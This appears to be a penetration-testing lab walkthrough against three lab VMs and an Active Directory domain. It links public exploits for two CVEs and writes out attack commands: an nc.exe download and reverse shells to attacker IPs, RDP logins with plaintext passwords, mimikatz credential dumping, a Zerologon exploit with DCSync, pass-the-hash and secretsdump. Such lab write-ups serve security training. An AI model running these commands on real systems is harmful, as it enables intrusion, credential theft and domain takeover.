## Introduce
![image](https://hackmd.io/_uploads/Sy2B9LW3el.png)

## Reconnaissance
### 1. Port
* VM1
![image](https://hackmd.io/_uploads/BkSdi8W3xg.png)
![image](https://hackmd.io/_uploads/SJ8FoLWhxe.png)

* VM2
![image](https://hackmd.io/_uploads/BJeLF5wybe.png)
![image](https://hackmd.io/_uploads/r1o0sIZ3xe.png)
![image](https://hackmd.io/_uploads/BkcDY9wkbl.png)
![image](https://hackmd.io/_uploads/rygtY5Pkbe.png)

* VM3
![image](https://hackmd.io/_uploads/B17e6Ubhex.png)
![image](https://hackmd.io/_uploads/HJSbpLbhll.png)
![image](https://hackmd.io/_uploads/BktMpLW3le.png)

### Applications
* VM1
  1. Port 5989
    ![image](https://hackmd.io/_uploads/HJl3TIZhxg.png)
  2. Port 135 & 445
    ![image](https://hackmd.io/_uploads/HymrC8W2lg.png)
    ![image](https://hackmd.io/_uploads/rk_uAUb2xx.png)
    ![image](https://hackmd.io/_uploads/rJrf1v-2ee.png)

* VM2
  1. Port 5989
    ![image](https://hackmd.io/_uploads/BkUCyDbnxg.png)
  
  2. Port 135 & 445
    ![image](https://hackmd.io/_uploads/r1pHxDW2xe.png)

* VM3
  1. 8443
    ![image](https://hackmd.io/_uploads/HJmKfPWnlg.png)
    
  2. 5001
    ![image](https://hackmd.io/_uploads/SyaAePWnlg.png)
    
## Exploit
* CVE-2020-10189
`https://srcincite.io/pocs/src-2020-0011.py.txt`
![image](https://hackmd.io/_uploads/Hk6sow-hxg.png)
![image](https://hackmd.io/_uploads/HkCJnvb3eg.png)
![image](https://hackmd.io/_uploads/SkuQ1Fzage.png)

* CVE-2020-14008
`https://github.com/JackHars/cve-2020-14008`
![image](https://hackmd.io/_uploads/Hk9-Jtf6ge.png)
![image](https://hackmd.io/_uploads/B1YA8FMalg.png)
![image](https://hackmd.io/_uploads/Hk1fDKfael.png)
![image](https://hackmd.io/_uploads/SyKXPYfTeg.png)

* File Upload
`curl http://192.168.45.167:6600/nc.exe -o C:\Windows\Temp\nc.exe`
`C:\Windows\Temp\nc.exe 192.168.45.204 9963 -e powershell`
`xfreerdp3 /v:192.168.126.95 /u:dave2 /dynamic-resolution /d:secure.secura.yzx /p:password123\!`
`\\192.168.45.243\share\nc.exe 192.168.45.243 9963 -e powershell`
![image](https://hackmd.io/_uploads/rJC9FtzTxe.png)

## Lateral Movement in Active Directory
* BloodHound
`Import-Module .\Sharphound.ps1`
`Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Windows\Temp\bloodhound" -OutputPrefix "corp audit"`
![image](https://hackmd.io/_uploads/ByWbdPCpgl.png)

* mimikatz
    1. `sekurlsa::logonpasswords`
    ![image](https://hackmd.io/_uploads/S1lrvj7Agg.png)

* winPeas
`xfreerdp3 /v:192.168.126.95 /u:administrator /dynamic-resolution /d:secure.secura.yzx /p:Reality2Show4\!.\?`
![image](https://hackmd.io/_uploads/SyepOxBCeg.png)

## Zerologon Abuse
`privilege::debug`
`lsadump::zerologon /target:192.168.178.97 /account:dc01$`
![image](https://hackmd.io/_uploads/ryMaXyK1Zg.png)
`lsadump::zerologon /target:192.168.178.97 /account:dc01$ /exploit`
![image](https://hackmd.io/_uploads/BkU2LxF1Wl.png)
`lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:Administrator /authuser:dc01$ /authdomain:main /authpassword:"" /authntlm`
![image](https://hackmd.io/_uploads/H1ovwgYJWl.png)
`impacket-wmiexec -hashes :d38e7c66048f80fd9566ab85afca76b1 secura/administrator@192.168.178.97`
![image](https://hackmd.io/_uploads/ByNxqxFkWl.png)
![image](https://hackmd.io/_uploads/H1WBjgKkbg.png)
![image](https://hackmd.io/_uploads/B1AHseKyWx.png)
`impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL`
![image](https://hackmd.io/_uploads/Bkj13eFyZg.png)
`python3 reinstall_original_pw.py dc01 192.168.178.97 aad3b435b51404eeaad3b435b51404ee`
![image](https://hackmd.io/_uploads/BkyWaltybl.png)

